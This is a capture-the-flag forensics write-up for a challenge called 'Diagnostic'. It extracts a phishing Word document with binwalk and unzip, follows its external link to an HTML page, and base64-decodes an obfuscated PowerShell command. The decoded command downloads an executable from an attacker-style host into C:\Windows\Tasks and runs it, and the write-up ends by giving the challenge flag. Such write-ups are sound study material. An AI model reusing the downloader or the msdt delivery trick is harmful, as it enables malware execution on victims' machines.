# Diagnostic
## Description
Our SOC has identified numerous phishing emails coming in claiming to have a document about an upcoming round of layoffs in the company. The emails all contain a link to diagnostic.htb/layoffs.doc. The DNS for that domain has since stopped resolving, but the server is still hosting the malicious document (your docker). Take a look and figure out what's going on.

## Steps
1. Downloding the layoffs.doc file from the webserver.<br />
command in terminal: `wget http://<ip>:>port>/layoffs.doc`

2. Opening the file using any tool like MS office or libre office, but there was nothing in that file.

3. Lets try binwalk, it is a tool for searching binary images for embedded files.<br />
command in teminal `binwalk layoffs.doc`<br />
Result from this shows that there are multiple archives present.

<pre>DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v2.0 to extract, name: _rels/
36            0x24            Zip archive data, at least v2.0 to extract, name: docProps/
75            0x4B            Zip archive data, at least v2.0 to extract, name: word/
110           0x6E            Zip archive data, at least v2.0 to extract, compressed size: 340, uncompressed size: 1312, name: [Content_Types].xml
499           0x1F3           Zip archive data, at least v2.0 to extract, name: word/_rels/
540           0x21C           Zip archive data, at least v2.0 to extract, name: word/theme/
581           0x245           Zip archive data, at least v2.0 to extract, compressed size: 2880, uncompressed size: 29364, name: word/styles.xml
3506          0xDB2           Zip archive data, at least v2.0 to extract, compressed size: 1220, uncompressed size: 3920, name: word/document.xml
4773          0x12A5          Zip archive data, at least v2.0 to extract, compressed size: 464, uncompressed size: 1567, name: word/fontTable.xml
5285          0x14A5          Zip archive data, at least v2.0 to extract, compressed size: 1007, uncompressed size: 2934, name: word/settings.xml
6339          0x18C3          Zip archive data, at least v2.0 to extract, compressed size: 307, uncompressed size: 803, name: word/webSettings.xml
6696          0x1A28          Zip archive data, at least v2.0 to extract, compressed size: 1529, uncompressed size: 6799, name: word/theme/theme1.xml
8276          0x2054          Zip archive data, at least v2.0 to extract, compressed size: 300, uncompressed size: 1015, name: word/_rels/document.xml.rels
8634          0x21BA          Zip archive data, at least v2.0 to extract, compressed size: 233, uncompressed size: 590, name: _rels/.rels
8908          0x22CC          Zip archive data, at least v2.0 to extract, compressed size: 353, uncompressed size: 704, name: docProps/app.xml
9307          0x245B          Zip archive data, at least v2.0 to extract, compressed size: 354, uncompressed size: 735, name: docProps/core.xml
10685         0x29BD          End of Zip archive, footer length: 22
</pre>

4. Now we have to extract these archives from the file. For this purpose we can unzip.
command in terminal `unzip -d extracted/ layoffs.doc`
<pre>Archive:  layoffs.doc
   creating: extracted/_rels/
   creating: extracted/docProps/
   creating: extracted/word/
  inflating: extracted/[Content_Types].xml  
   creating: extracted/word/_rels/
   creating: extracted/word/theme/
  inflating: extracted/word/styles.xml  
  inflating: extracted/word/document.xml  
  inflating: extracted/word/fontTable.xml  
  inflating: extracted/word/settings.xml  
  inflating: extracted/word/webSettings.xml  
  inflating: extracted/word/theme/theme1.xml  
  inflating: extracted/word/_rels/document.xml.rels  
  inflating: extracted/_rels/.rels   
  inflating: extracted/docProps/app.xml  
  inflating: extracted/docProps/core.xml </pre>

  5. Now there's no shrotcut we have to check all the files and look for if there is some important information that we can use.<br />
We started with the settings xml files and then moved to documents xml file.
  
  6. In document.xml.rels file there is one section which mentions `Target="http://diagnostic.htb:32740/223_index_style_fancy.html!"`

7. When visiting the web, there is nothing in the page, checking the page source information there is a script tag with good amount of information, let's remove the unnecessay ones.<br />
There are 5 different hashes present

<pre>
JHtmYGlsZX0gPSAoIns3fXsxfXs2fXs4fXs1fXszfXsyfXs0fXswfSItZid9LmV4ZScsJ0J7bXNEdF80c19BX3ByMCcsJ0UnLCdyLi4ucycsJzNNc19iNEQnLCdsMycsJ3RvQycsJ0hUJywnMGxfaDRuRCcpCiYoInsxfXsyfXswfXszfSItZid1ZXMnLCdJbnZva2UnLCctV2ViUmVxJywndCcpICgiezJ9ezh9ezB9ezR9ezZ9ezV9ezN9ezF9ezd9Ii1mICc6Ly9hdScsJy5odGIvMicsJ2gnLCdpYycsJ3RvJywnYWdub3N0JywnbWF0aW9uLmRpJywnL24uZXhlJywndHRwcycpIC1PdXRGaWxlICJDOlxXaW5kb3dzXFRhc2tzXCRmaWxlIgomKCgoIns1fXs2fXsyfXs4fXswfXszfXs3fXs0fXsxfSIgLWYnTDlGVGFza3NMOUYnLCdpbGUnLCdvdycsJ0wnLCdmJywnQzonLCdMOUZMOUZXaW5kJywnOUZrekgnLCdzTDlGJykpICAtQ1JlcGxBY2Una3pIJyxbY2hBcl0zNiAtQ1JlcGxBY2UoW2NoQXJdNzYrW2NoQXJdNTcrW2NoQXJdNzApLFtjaEFyXTkyKQo=

Tm93IGZvciBhIGNoZWVyIHRoZXkgYXJlIGhlcmUsCnRyaXVtcGhhbnQhCkhlcmUgdGhleSBjb21lIHdpdGggYmFubmVycyBmbHlpbmcsCkluIHN0YWx3YXJ0IHN0ZXAgdGhleSdyZSBuaWdoaW5nLApXaXRoIHNob3V0cyBvZiB2aWN0J3J5IGNyeWluZywKV2UgaHVycmFoLCBodXJyYWgsIHdlIGdyZWV0IHlvdSBub3csCkhhaWwhCgpGYXIgd2UgdGhlaXIgcHJhaXNlcyBzaW5nCkZvciB0aGUgZ2xvcnkgYW5kIGZhbWUgdGhleSd2ZSBicm8ndCB1cwpMb3VkIGxldCB0aGUgYmVsbHMgdGhlbSByaW5nCkZvciBoZXJlIHRoZXkgY29tZSB3aXRoIGJhbm5lcnMgZmx5aW5nCkZhciB3ZSB0aGVpciBwcmFpc2VzIHRlbGwKRm9yIHRoZSBnbG9yeSBhbmQgZmFtZSB0aGV5J3ZlIGJybyd0IHVzCkxvdWQgbGV0IHRoZSBiZWxscyB0aGVtIHJpbmcKRm9yIGhlcmUgdGhleSBjb21lIHdpdGggYmFubmVycyBmbHlpbmcKSGVyZSB0aGV5IGNvbWUsIEh1cnJhaCEKCkhhaWwhIHRvIHRoZSB2aWN0b3JzIHZhbGlhbnQKSGFpbCEgdG8gdGhlIGNvbnF1J3JpbmcgaGVyb2VzCkhhaWwhIEhhaWwhIHRvIE1pY2hpZ2FuCnRoZSBsZWFkZXJzIGFuZCBiZXN0CkhhaWwhIHRvIHRoZSB2aWN0b3JzIHZhbGlhbnQKSGFpbCEgdG8gdGhlIGNvbnF1J3JpbmcgaGVyb2VzCkhhaWwhIEhhaWwhIHRvIE1pY2hpZ2FuLAp0aGUgY2hhbXBpb25zIG9mIHRoZSBXZXN0IQoKV2UgY2hlZXIgdGhlbSBhZ2FpbgpXZSBjaGVlciBhbmQgY2hlZXIgYWdhaW4KRm9yIE1pY2hpZ2FuLCB3ZSBjaGVlciBmb3IgTWljaGlnYW4KV2UgY2hlZXIgd2l0aCBtaWdodCBhbmQgbWFpbgpXZSBjaGVlciwgY2hlZXIsIGNoZWVyCldpdGggbWlnaHQgYW5kIG1haW4gd2UgY2hlZXIhCgoKSGFpbCEgdG8gdGhlIHZpY3RvcnMgdmFsaWFudApIYWlsISB0byB0aGUgY29ucXUncmluZyBoZXJvZXMKSGFpbCEgSGFpbCEgdG8gTWljaGlnYW4sCnRoZSBjaGFtcGlvbnMgb2YgdGhlIFdlc3Qh

Ck5vdyBmb3IgYSBjaGVlciB0aGV5IGFyZSBoZXJlLAp0cml1bXBoYW50IQpIZXJlIHRoZXkgY29tZSB3aXRoIGJhbm5lcnMgZmx5aW5nLApJbiBzdGFsd2FydCBzdGVwIHRoZXkncmUgbmlnaGluZywKV2l0aCBzaG91dHMgb2YgdmljdCdyeSBjcnlpbmcsCldlIGh1cnJhaCwgaHVycmFoLCB3ZSBncmVldCB5b3Ugbm93LApIYWlsIQoKRmFyIHdlIHRoZWlyIHByYWlzZXMgc2luZwpGb3IgdGhlIGdsb3J5IGFuZCBmYW1lIHRoZXkndmUgYnJvJ3QgdXMKTG91ZCBsZXQgdGhlIGJlbGxzIHRoZW0gcmluZwpGb3IgaGVyZSB0aGV5IGNvbWUgd2l0aCBiYW5uZXJzIGZseWluZwpGYXIgd2UgdGhlaXIgcHJhaXNlcyB0ZWxsCkZvciB0aGUgZ2xvcnkgYW5kIGZhbWUgdGhleSd2ZSBicm8ndCB1cwpMb3VkIGxldCB0aGUgYmVsbHMgdGhlbSByaW5nCkZvciBoZXJlIHRoZXkgY29tZSB3aXRoIGJhbm5lcnMgZmx5aW5nCkhlcmUgdGhleSBjb21lLCBIdXJyYWghCgpIYWlsISB0byB0aGUgdmljdG9ycyB2YWxpYW50CkhhaWwhIHRvIHRoZSBjb25xdSdyaW5nIGhlcm9lcwpIYWlsISBIYWlsISB0byBNaWNoaWdhbgp0aGUgbGVhZGVycyBhbmQgYmVzdApIYWlsISB0byB0aGUgdmljdG9ycyB2YWxpYW50CkhhaWwhIHRvIHRoZSBjb25xdSdyaW5nIGhlcm9lcwpIYWlsISBIYWlsISB0byBNaWNoaWdhbiwKdGhlIGNoYW1waW9ucyBvZiB0aGUgV2VzdCEKCldlIGNoZWVyIHRoZW0gYWdhaW4KV2UgY2hlZXIgYW5kIGNoZWVyIGFnYWluCkZvciBNaWNoaWdhbiwgd2UgY2hlZXIgZm9yIE1pY2hpZ2FuCldlIGNoZWVyIHdpdGggbWlnaHQgYW5kIG1haW4KV2UgY2hlZXIsIGNoZWVyLCBjaGVlcgpXaXRoIG1pZ2h0IGFuZCBtYWluIHdlIGNoZWVyIQoKCkhhaWwhIHRvIHRoZSB2aWN0b3JzIHZhbGlhbnQKSGFpbCEgdG8gdGhlIGNvbnF1J3JpbmcgaGVyb2VzCkhhaWwhIEhhaWwhIHRvIE1pY2hpZ2FuLAp0aGUgY2hhbXBpb25zIG9mIHRoZSBXZXN0IQ== CgpOb3cgZm9yIGEgY2hlZXIgdGhleSBhcmUgaGVyZSwKdHJpdW1waGFudCEKSGVyZSB0aGV5IGNvbWUgd2l0aCBiYW5uZXJzIGZseWluZywKSW4gc3RhbHdhcnQgc3RlcCB0aGV5J3JlIG5pZ2hpbmcsCldpdGggc2hvdXRzIG9mIHZpY3QncnkgY3J5aW5nLApXZSBodXJyYWgsIGh1cnJhaCwgd2UgZ3JlZXQgeW91IG5vdywKSGFpbCEKCkZhciB3ZSB0aGVpciBwcmFpc2VzIHNpbmcKRm9yIHRoZSBnbG9yeSBhbmQgZmFtZSB0aGV5J3ZlIGJybyd0IHVzCkxvdWQgbGV0IHRoZSBiZWxscyB0aGVtIHJpbmcKRm9yIGhlcmUgdGhleSBjb21lIHdpdGggYmFubmVycyBmbHlpbmcKRmFyIHdlIHRoZWlyIHByYWlzZXMgdGVsbApGb3IgdGhlIGdsb3J5IGFuZCBmYW1lIHRoZXkndmUgYnJvJ3QgdXMKTG91ZCBsZXQgdGhlIGJlbGxzIHRoZW0gcmluZwpGb3IgaGVyZSB0aGV5IGNvbWUgd2l0aCBiYW5uZXJzIGZseWluZwpIZXJlIHRoZXkgY29tZSwgSHVycmFoIQoKSGFpbCEgdG8gdGhlIHZpY3RvcnMgdmFsaWFudApIYWlsISB0byB0aGUgY29ucXUncmluZyBoZXJvZXMKSGFpbCEgSGFpbCEgdG8gTWljaGlnYW4KdGhlIGxlYWRlcnMgYW5kIGJlc3QKSGFpbCEgdG8gdGhlIHZpY3RvcnMgdmFsaWFudApIYWlsISB0byB0aGUgY29ucXUncmluZyBoZXJvZXMKSGFpbCEgSGFpbCEgdG8gTWljaGlnYW4sCnRoZSBjaGFtcGlvbnMgb2YgdGhlIFdlc3QhCgpXZSBjaGVlciB0aGVtIGFnYWluCldlIGNoZWVyIGFuZCBjaGVlciBhZ2FpbgpGb3IgTWljaGlnYW4sIHdlIGNoZWVyIGZvciBNaWNoaWdhbgpXZSBjaGVlciB3aXRoIG1pZ2h0IGFuZCBtYWluCldlIGNoZWVyLCBjaGVlciwgY2hlZXIKV2l0aCBtaWdodCBhbmQgbWFpbiB3ZSBjaGVlciEKCgpIYWlsISB0byB0aGUgdmljdG9ycyB2YWxpYW50CkhhaWwhIHRvIHRoZSBjb25xdSdyaW5nIGhlcm9lcwpIYWlsISBIYWlsISB0byBNaWNoaWdhbiwKdGhlIGNoYW1waW9ucyBvZiB0aGUgV2VzdCE=

SGFyayB0aGUgc291bmQgb2YgVGFyIEhlZWwgdm9pY2VzClJpbmdpbmcgY2xlYXIgYW5kIFRydWUKU2luZ2luZyBDYXJvbGluYSdzIHByYWlzZXMKU2hvdXRpbmcgTi5DLlUuCgpIYWlsIHRvIHRoZSBicmlnaHRlc3QgU3RhciBvZiBhbGwKQ2xlYXIgaXRzIHJhZGlhbmNlIHNoaW5lCkNhcm9saW5hIHByaWNlbGVzcyBnZW0sClJlY2VpdmUgYWxsIHByYWlzZXMgdGhpbmUuCgpOZWF0aCB0aGUgb2FrcyB0aHkgc29ucyBhbmQgZGF1Z2h0ZXJzCkhvbWFnZSBwYXkgdG8gdGhlZQpUaW1lIHdvcm4gd2FsbHMgZ2l2ZSBiYWNrIHRoZWlyIGVjaG8KSGFpbCB0byBVLk4uQy4KClRob3VnaCB0aGUgc3Rvcm1zIG9mIGxpZmUgYXNzYWlsIHVzClN0aWxsIG91ciBoZWFydHMgYmVhdCB0cnVlCk5hdWdodCBjYW4gYnJlYWsgdGhlIGZyaWVuZHNoaXBzIGZvcm1lZCBhdApEZWFyIG9sZCBOLkMuVS4=

CkhhcmsgdGhlIHNvdW5kIG9mIFRhciBIZWVsIHZvaWNlcwpSaW5naW5nIGNsZWFyIGFuZCBUcnVlClNpbmdpbmcgQ2Fyb2xpbmEncyBwcmFpc2VzClNob3V0aW5nIE4uQy5VLgoKSGFpbCB0byB0aGUgYnJpZ2h0ZXN0IFN0YXIgb2YgYWxsCkNsZWFyIGl0cyByYWRpYW5jZSBzaGluZQpDYXJvbGluYSBwcmljZWxlc3MgZ2VtLApSZWNlaXZlIGFsbCBwcmFpc2VzIHRoaW5lLgoKTmVhdGggdGhlIG9ha3MgdGh5IHNvbnMgYW5kIGRhdWdodGVycwpIb21hZ2UgcGF5IHRvIHRoZWUKVGltZSB3b3JuIHdhbGxzIGdpdmUgYmFjayB0aGVpciBlY2hvCkhhaWwgdG8gVS5OLkMuCgpUaG91Z2ggdGhlIHN0b3JtcyBvZiBsaWZlIGFzc2FpbCB1cwpTdGlsbCBvdXIgaGVhcnRzIGJlYXQgdHJ1ZQpOYXVnaHQgY2FuIGJyZWFrIHRoZSBmcmllbmRzaGlwcyBmb3JtZWQgYXQKRGVhciBvbGQgTi5DLlUu
</pre>

8. Decoding the message, we can either use `echo "hash" | base64 -d` or use some online tool like cyberchef

<pre>
${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
&("{1}{2}{0}{3}"-f'ues','Invoke','-WebReq','t') ("{2}{8}{0}{4}{6}{5}{3}{1}{7}"-f '://au','.htb/2','h','ic','to','agnost','mation.di','/n.exe','ttps') -OutFile "C:\Windows\Tasks\$file"
&((("{5}{6}{2}{8}{0}{3}{7}{4}{1}" -f'L9FTasksL9F','ile','ow','L','f','C:','L9FL9FWind','9FkzH','sL9F'))  -CReplAce'kzH',[chAr]36 -CReplAce([chAr]76+[chAr]57+[chAr]70),[chAr]92)

Now for a cheer they are here,
triumphant!
Here they come with banners flying,
In stalwart step they're nighing,
With shouts of vict'ry crying,
We hurrah, hurrah, we greet you now,
Hail!

Far we their praises sing
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Far we their praises tell
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Here they come, Hurrah!

Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan
the leaders and best
Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!

We cheer them again
We cheer and cheer again
For Michigan, we cheer for Michigan
We cheer with might and main
We cheer, cheer, cheer
With might and main we cheer!


Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!


Now for a cheer they are here,
triumphant!
Here they come with banners flying,
In stalwart step they're nighing,
With shouts of vict'ry crying,
We hurrah, hurrah, we greet you now,
Hail!

Far we their praises sing
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Far we their praises tell
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Here they come, Hurrah!

Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan
the leaders and best
Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!

We cheer them again
We cheer and cheer again
For Michigan, we cheer for Michigan
We cheer with might and main
We cheer, cheer, cheer
With might and main we cheer!


Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!

Now for a cheer they are here,
triumphant!
Here they come with banners flying,
In stalwart step they're nighing,
With shouts of vict'ry crying,
We hurrah, hurrah, we greet you now,
Hail!

Far we their praises sing
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Far we their praises tell
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Here they come, Hurrah!

Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan
the leaders and best
Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!

We cheer them again
We cheer and cheer again
For Michigan, we cheer for Michigan
We cheer with might and main
We cheer, cheer, cheer
With might and main we cheer!


Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!

Hark the sound of Tar Heel voices
Ringing clear and True
Singing Carolina's praises
Shouting N.C.U.

Hail to the brightest Star of all
Clear its radiance shine
Carolina priceless gem,
Receive all praises thine.

Neath the oaks thy sons and daughters
Homage pay to thee
Time worn walls give back their echo
Hail to U.N.C.

Though the storms of life assail us
Still our hearts beat true
Naught can break the friendships formed at
Dear old N.C.U.
</pre>

9. This is a lyrics file, not that informative but the initial part looks like something we can use, but no idea what this is.<br />
By observing the file we can see that some exe is being executed and then we have `Invoke -WebReqest` and `-OutFile` as well, which confirms that this is a PowerShell command which is obfuscated. Another thing that we can observe is that there is some sort of flag that is present as well.

10. The major content `${file} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}" -f '}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
`. We can now mannually combine to get the flag or look some tool, as this is obfuscated with multiple techniques<br />

| File0 | File1              | File2 | File3 | File4    | File5 | File6 | File7 | File8    |
|-------|--------------------|-------|-------|----------|-------|-------|-------|----------|
| }.exe | B{msDt_4s_A_pr0    | E     | r...s | 3Ms_b4D  | l3    | toC   | HT    | 0l_h4nD  |

11. Now arraenging them according to the order mentioned `"{7}{1}{6}{8}{5}{3}{2}{4}{0}"`

12. The Flag is `HTB{msDt_4s_A_pr0toC0l_h4nDl3r...sE3Ms_b4D}`
